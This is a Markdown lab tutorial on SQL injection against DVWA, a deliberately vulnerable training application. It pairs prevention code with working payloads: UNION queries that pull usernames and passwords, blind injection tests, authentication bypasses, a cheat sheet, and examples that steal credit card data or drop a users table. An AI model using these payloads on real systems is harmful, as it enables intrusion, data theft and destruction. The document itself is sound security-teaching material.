# SQL Injection Lab - DVWA

## What is SQL Injection?

SQL Injection is a web security vulnerability that allows attackers to interfere with the queries that an application makes to its database. It's like tricking the database into doing something it shouldn't do.

**Simple Example:**
- Website asks: "What's your username?"
- Normal user types: `john`
- Attacker types: `john' OR '1'='1`
- Database gets confused and shows all data!

---

## Lab Setup

**Tool:** DVWA (Damn Vulnerable Web Application)  
**Section:** SQL Injection  
**Difficulty Levels:** Low, Medium, High, Impossible

---

## Security Level: LOW

### Objective
Extract information from the database using SQL injection.

### Step 1: Understanding the Form
- Navigate to DVWA → SQL Injection
- You'll see a form asking for a "User ID"
- Normally, you'd enter: `1`, `2`, `3`, etc.

### Step 2: Testing for SQL Injection
**Normal Input:**
```
User ID: 1
```
**Result:** Shows user information

### Step 3: Basic SQL Injection
**Payload:**
```sql
1' OR '1'='1
```

**What this does:**
- The `'` closes the original query
- `OR '1'='1'` makes the condition always true
- Shows ALL users in the database!

### Step 4: Getting Database Information
**Payload to get database version:**
```sql
1' UNION SELECT NULL, version()#
```

**Payload to get database name:**
```sql
1' UNION SELECT NULL, database()#
```

**Payload to get table names:**
```sql
1' UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema=database()#
```

### Step 5: Extracting User Data
**Get column names:**
```sql
1' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users'#
```

**Get usernames and passwords:**
```sql
1' UNION SELECT user, password FROM users#
```

### Vulnerability Explanation
The code doesn't filter user input, allowing SQL commands to be injected directly.

**Vulnerable Code (Example):**
```php
$query = "SELECT * FROM users WHERE user_id = '$id'";
```

---

## Security Level: MEDIUM

### Changes from Low
- Some basic filtering is applied
- Simple payloads might not work

### Bypass Technique
**Original Payload (blocked):**
```sql
1' OR '1'='1
```

**Bypassed Payload:**
```sql
1 OR 1=1
```

**Why it works:**
- Removes quotes that might be filtered
- Uses numeric comparison instead

### Advanced Extraction
**Get all users:**
```sql
1 UNION SELECT user, password FROM users#
```

**Get specific user:**
```sql
1 UNION SELECT user, password FROM users WHERE user='admin'#
```

---

## Security Level: HIGH

### Changes from Medium
- More strict filtering
- May use prepared statements or better validation

### Advanced Bypass Techniques

**Time-Based Blind SQL Injection:**
```sql
1' AND SLEEP(5)#
```
If the page delays 5 seconds, injection works!

**Boolean-Based Blind SQL Injection:**
```sql
1' AND '1'='1
1' AND '1'='2
```
Compare responses to extract data bit by bit.

**Using Comments:**
```sql
1' OR '1'='1'-- 
1' OR '1'='1'/*
```

---

## Security Level: IMPOSSIBLE

### Why it's Secure
- Uses prepared statements (parameterized queries)
- Input is properly validated and sanitized
- SQL and user input are kept separate

**Secure Code (Example):**
```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE user_id = ?");
$stmt->execute([$id]);
```



---

## Common SQL Injection Payloads

### Basic Authentication Bypass
```sql
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
admin'--
admin'#
```

### Union-Based Injection
```sql
' UNION SELECT NULL--
' UNION SELECT NULL, NULL--
' UNION SELECT user, password FROM users--
```

### Information Gathering
```sql
' UNION SELECT NULL, version()--
' UNION SELECT NULL, database()--
' UNION SELECT NULL, user()--
```

### Table Discovery
```sql
' UNION SELECT NULL, table_name FROM information_schema.tables--
' UNION SELECT NULL, column_name FROM information_schema.columns--
```

---

## Detection Methods

### Manual Testing
1. Add a single quote `'` - Does it error?
2. Add `' OR '1'='1` - Do you get more results?
3. Add `' AND '1'='2` - Do results disappear?
4. Add `' UNION SELECT NULL--` - Does it work?

### Common Error Messages (Hints of SQL Injection)
```
You have an error in your SQL syntax
MySQL error
ODBC SQL Server Driver
Warning: mysql_fetch_array()
```

---

## Prevention Methods

### 1. Use Prepared Statements
```php
// Vulnerable
$query = "SELECT * FROM users WHERE id = '$id'";

// Secure
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$id]);
```

### 2. Input Validation
```php
// Only allow numbers for User ID
if (!is_numeric($id)) {
    die("Invalid input");
}
```

### 3. Escape Special Characters
```php
$id = mysqli_real_escape_string($conn, $id);
```

### 4. Use ORM (Object-Relational Mapping)
```python
User.objects.get(id=user_id)
```

### 5. Least Privilege Principle
- Database user should only have necessary permissions
- Don't use admin account for web queries

---

## Impact of SQL Injection

### What Attackers Can Do:
✅ Steal sensitive data (passwords, credit cards, personal info)  
✅ Modify or delete data  
✅ Bypass authentication (login as admin)  
✅ Execute system commands on the database server  
✅ Read files from the server  
✅ Take complete control of the database  

---



---



---

## Real-World Examples

### Example 1: E-commerce Site
```sql
Product ID: 5' UNION SELECT credit_card, cvv FROM payments--
```
**Result:** Steal all credit card information

### Example 2: Login Bypass
```sql
Username: admin'--
Password: (anything)
```
**Result:** Login as admin without knowing password

### Example 3: Data Deletion
```sql
ID: 1'; DROP TABLE users--
```
**Result:** Delete entire users table (VERY DANGEROUS!)

---

## Summary

### Key Takeaways:
1. **SQL Injection** = Attacker controls database queries
2. **Root Cause** = Lack of input validation
3. **Prevention** = Use prepared statements + input validation
4. **Impact** = Can be catastrophic (data theft, deletion)
5. **Always test** = But only on systems you own!

### Security Mindset:
- Never trust user input
- Always validate and sanitize
- Use security best practices
- Keep systems updated

---


